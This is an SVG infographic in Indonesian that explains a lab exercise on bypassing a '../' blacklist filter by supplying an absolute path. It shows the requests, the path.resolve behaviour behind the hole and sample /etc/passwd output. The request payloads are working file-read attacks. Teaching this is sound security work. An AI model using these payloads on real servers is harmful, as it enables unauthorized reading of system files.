<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
  <defs>
    <!-- Background Gradient -->
    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#090D16"/>
      <stop offset="50%" stop-color="#0F172A"/>
      <stop offset="100%" stop-color="#090D16"/>
    </linearGradient>

    <!-- Card Backgrounds -->
    <linearGradient id="cardGrad" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
    </linearGradient>

    <linearGradient id="attackerGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#1E1B4B"/>
      <stop offset="100%" stop-color="#0F172A"/>
    </linearGradient>

    <linearGradient id="leakGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#881337"/>
      <stop offset="100%" stop-color="#4C0519"/>
    </linearGradient>

    <!-- Glow Filters -->
    <filter id="glowCyan" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowOrange" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowRed" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="7" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>

    <!-- Drop Shadow -->
    <filter id="cardShadow" x="-10%" y="-10%" width="120%" height="125%">
      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
    </filter>

    <!-- Arrow Markers -->
    <marker id="arrowCyan" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#38BDF8"/>
    </marker>
    <marker id="arrowOrange" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#F97316"/>
    </marker>
    <marker id="arrowRed" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#F43F5E"/>
    </marker>
  </defs>

  <style>
    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; font-weight: 600; }
    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; fill: #CBD5E1; }
    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11px; font-weight: 700; }
  </style>

  <!-- Background Base -->
  <rect width="1080" height="560" rx="16" fill="url(#bgGrad)"/>
  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>

  <!-- Grid Line Pattern -->
  <g opacity="0.06" stroke="#94A3B8" stroke-width="1">
    <line x1="0" y1="80" x2="1080" y2="80"/>
    <line x1="0" y1="160" x2="1080" y2="160"/>
    <line x1="0" y1="240" x2="1080" y2="240"/>
    <line x1="0" y1="320" x2="1080" y2="320"/>
    <line x1="0" y1="400" x2="1080" y2="400"/>
    <line x1="0" y1="480" x2="1080" y2="480"/>
    <line x1="120" y1="0" x2="120" y2="560"/>
    <line x1="240" y1="0" x2="240" y2="560"/>
    <line x1="360" y1="0" x2="360" y2="560"/>
    <line x1="480" y1="0" x2="480" y2="560"/>
    <line x1="600" y1="0" x2="600" y2="560"/>
    <line x1="720" y1="0" x2="720" y2="560"/>
    <line x1="840" y1="0" x2="840" y2="560"/>
    <line x1="960" y1="0" x2="960" y2="560"/>
  </g>

  <!-- Header Section -->
  <g transform="translate(48, 44)">
    <rect x="0" y="0" width="165" height="24" rx="12" fill="#F43F5E" fill-opacity="0.15" stroke="#F43F5E" stroke-width="1"/>
    <text x="82" y="16" text-anchor="middle" class="badge" fill="#F43F5E">PATH TRAVERSAL BYPASS</text>
    <text x="180" y="18" class="title" font-size="20">Directory Traversal: Bypassing dengan Absolute Path</text>
    <text x="0" y="42" class="subtitle" font-size="13">Eksploitasi celah pembacaan berkas sistem ketika filter hanya memblokir "../" tapi mengabaikan Absolute Path ("/etc/passwd")</text>
  </g>

  <!-- ==================== LEFT CARD: ATTACKER REQUEST ==================== -->
  <g transform="translate(48, 120)" filter="url(#cardShadow)">
    <rect width="310" height="400" rx="14" fill="url(#attackerGrad)" stroke="#818CF8" stroke-width="1.5"/>
    
    <!-- Header -->
    <circle cx="38" cy="38" r="20" fill="#3730A3" stroke="#818CF8" stroke-width="1.5"/>
    <path d="M38 28 A 5 5 0 1 0 38 38 A 5 5 0 1 0 38 28 M30 46 C30 42 33 41 38 41 C43 41 46 42 46 46 Z" fill="#C7D2FE"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#A5B4FC">Penyerang (Attacker)</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Injeksi Parameter Filename</text>

    <line x1="18" y1="68" x2="292" y2="68" stroke="#334155" stroke-width="1"/>

    <!-- Step 1: Failed Relative Traversal -->
    <rect x="16" y="80" width="278" height="88" rx="8" fill="#450A0A" fill-opacity="0.3" stroke="#DC2626" stroke-width="1"/>
    <text x="26" y="100" class="badge" fill="#F87171">1. COBA RELATIVE TRAVERSAL:</text>
    <text x="26" y="120" class="code-text" fill="#FECDD3">GET /image?filename=</text>
    <text x="26" y="136" class="code-text" fill="#FCA5A5">../../../etc/passwd</text>
    <text x="26" y="156" class="desc-text" font-size="11" fill="#F87171">❌ DIBLOKIR: Server mendeteksi "../"</text>

    <!-- Step 2: Absolute Path Bypass Request -->
    <rect x="16" y="180" width="278" height="198" rx="8" fill="#090D16" stroke="#4F46E5" stroke-width="1.2"/>
    <text x="26" y="202" class="badge" fill="#38BDF8">2. BYPASS VIA ABSOLUTE PATH:</text>
    
    <text x="26" y="226" class="code-text" fill="#38BDF8">GET /image?filename=</text>
    
    <rect x="22" y="234" width="266" height="26" rx="4" fill="#0C4A6E" stroke="#38BDF8" stroke-width="1" filter="url(#glowCyan)"/>
    <text x="30" y="252" class="code-text" fill="#BAE6FD" font-weight="700">/etc/passwd</text>
    <text x="130" y="252" class="badge" fill="#7DD3FC">← ABSOLUTE PATH</text>

    <text x="26" y="284" class="code-text" fill="#94A3B8">Host: target-website.com</text>
    <text x="26" y="302" class="code-text" fill="#94A3B8">Cookie: session=xyz...</text>

    <rect x="26" y="318" width="258" height="46" rx="6" fill="#1E1B4B" stroke="#6366F1" stroke-width="1"/>
    <text x="34" y="336" class="desc-text" font-size="11" fill="#C7D2FE">💡 Tidak ada karakter <tspan fill="#F43F5E" font-weight="700">"../"</tspan></text>
    <text x="34" y="352" class="desc-text" font-size="10.5" fill="#94A3B8">Filter blacklist terkecoh dan meloloskan request!</text>
  </g>

  <!-- ==================== CENTER CARD: VULNERABLE SERVER RESOLUTION ==================== -->
  <g transform="translate(385, 120)" filter="url(#cardShadow)">
    <rect width="340" height="400" rx="14" fill="url(#cardGrad)" stroke="#475569" stroke-width="1.5"/>
    
    <!-- Server Icon & Header -->
    <rect x="18" y="18" width="38" height="38" rx="8" fill="#334155" stroke="#64748B" stroke-width="1"/>
    <path d="M26 28 h22 M26 34 h22 M26 40 h10" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#F8FAFC">Server &amp; Path Resolver</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Perilaku Pemrosesan Direktori</text>

    <line x1="18" y1="68" x2="322" y2="68" stroke="#334155" stroke-width="1"/>

    <!-- Filter Check Box -->
    <rect x="16" y="80" width="308" height="68" rx="8" fill="#064E3B" fill-opacity="0.3" stroke="#059669" stroke-width="1"/>
    <text x="26" y="100" class="badge" fill="#34D399">✓ 1. CEK FILTER BLACKLIST:</text>
    <text x="26" y="120" class="desc-text" font-size="11.5">Apakah terdapat "../" ? → <tspan fill="#34D399" font-weight="700">TIDAK ADA</tspan></text>
    <text x="26" y="136" class="desc-text" font-size="11" fill="#6EE7B7">Hasil: Request diizinkan lolos ke file reader.</text>

    <!-- Path Resolution Trap -->
    <rect x="16" y="158" width="308" height="222" rx="8" fill="#451A03" fill-opacity="0.4" stroke="#F97316" stroke-width="1.2"/>
    <text x="26" y="180" class="badge" fill="#FDBA74">⚡ 2. PERILAKU PATH JOIN / RESOLVE:</text>
    
    <text x="26" y="202" class="desc-text" font-size="11.5">Base folder: <tspan class="code-text" fill="#FDBA74">/var/www/images/</tspan></text>
    <text x="26" y="220" class="desc-text" font-size="11.5">Input user: <tspan class="code-text" fill="#38BDF8">/etc/passwd</tspan></text>

    <!-- Code Block with Gotcha -->
    <rect x="24" y="232" width="292" height="66" rx="6" fill="#1C1917" stroke="#7C2D12" stroke-width="1"/>
    <text x="32" y="250" class="code-text" font-size="11" fill="#CBD5E1">// Node.js / Python Path Join Gotcha:</text>
    <text x="32" y="266" class="code-text" font-size="11" fill="#FDE047">path.resolve(baseDir, "/etc/passwd")</text>
    <text x="32" y="284" class="code-text" font-size="11" fill="#F43F5E">=&gt; Hasil Resolve: "/etc/passwd"</text>

    <text x="26" y="318" class="desc-text" font-size="11.5" fill="#FECDD3">⚠️ Slash <tspan font-weight="700" fill="#FFFFFF">"/"</tspan> di awal input mereset base path!</text>
    <text x="26" y="336" class="desc-text" font-size="11">Server langsung membaca file dari root OS filesystem:</text>
    <text x="26" y="356" class="code-text" font-size="11.5" fill="#38BDF8">fs.readFileSync("/etc/passwd")</text>
  </g>

  <!-- ==================== RIGHT CARD: LEAKED SYSTEM FILE ==================== -->
  <g transform="translate(752, 120)" filter="url(#cardShadow)">
    <rect width="280" height="400" rx="14" fill="url(#leakGrad)" stroke="#F43F5E" stroke-width="1.5"/>
    
    <!-- File Icon & Header -->
    <rect x="18" y="18" width="38" height="38" rx="8" fill="#9F1239" stroke="#FB7185" stroke-width="1.5"/>
    <path d="M28 26 H42 L48 32 V46 H28 Z M42 26 V32 H48" fill="none" stroke="#FFE4E6" stroke-width="1.5"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#FFE4E6">Berkas Sistem Bocor</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#FECDD3">Target: /etc/passwd</text>

    <line x1="18" y1="68" x2="262" y2="68" stroke="#9F1239" stroke-width="1"/>

    <!-- Leaked Content Terminal -->
    <rect x="16" y="80" width="248" height="210" rx="8" fill="#1C1917" stroke="#BE123C" stroke-width="1"/>
    <text x="26" y="102" class="badge" fill="#FB7185">HTTP 200 OK (RESPONSE BODY):</text>
    
    <text x="26" y="126" class="code-text" font-size="10.5" fill="#A7F3D0">root:x:0:0:root:/root:/bin/bash</text>
    <text x="26" y="144" class="code-text" font-size="10.5" fill="#CBD5E1">daemon:x:1:1:daemon:/usr/sbin</text>
    <text x="26" y="162" class="code-text" font-size="10.5" fill="#CBD5E1">bin:x:2:2:bin:/bin:/usr/sbin</text>
    <text x="26" y="180" class="code-text" font-size="10.5" fill="#CBD5E1">sys:x:3:3:sys:/dev:/usr/sbin</text>
    <text x="26" y="198" class="code-text" font-size="10.5" fill="#CBD5E1">www-data:x:33:33:www-data:/var</text>
    <text x="26" y="216" class="code-text" font-size="10.5" fill="#FDE047">carlos:x:1001:1001:Carlos:/home</text>
    <text x="26" y="234" class="code-text" font-size="10.5" fill="#CBD5E1">peter:x:1002:1002:Peter:/home</text>
    <text x="26" y="254" class="code-text" font-size="10" fill="#94A3B8">... [seluruh user Linux terekspos]</text>

    <!-- Lab Solved Box -->
    <rect x="16" y="302" width="248" height="80" rx="8" fill="#064E3B" stroke="#10B981" stroke-width="1.5" filter="url(#glowRed)"/>
    <text x="140" y="326" text-anchor="middle" class="badge" fill="#A7F3D0">🎉 LAB SOLVED!</text>
    <text x="140" y="348" text-anchor="middle" class="desc-text" font-size="11" fill="#ECFDF5">Penyerang berhasil membaca</text>
    <text x="140" y="364" text-anchor="middle" class="desc-text" font-size="11" fill="#ECFDF5">berkas root /etc/passwd</text>
  </g>

  <!-- Flow Arrows -->
  <path d="M 358 250 L 385 250" fill="none" stroke="#38BDF8" stroke-width="2.5" stroke-dasharray="5,4" marker-end="url(#arrowCyan)" filter="url(#glowCyan)"/>
  <path d="M 725 250 L 752 250" fill="none" stroke="#F43F5E" stroke-width="2.5" stroke-dasharray="5,4" marker-end="url(#arrowRed)" filter="url(#glowRed)"/>

</svg>
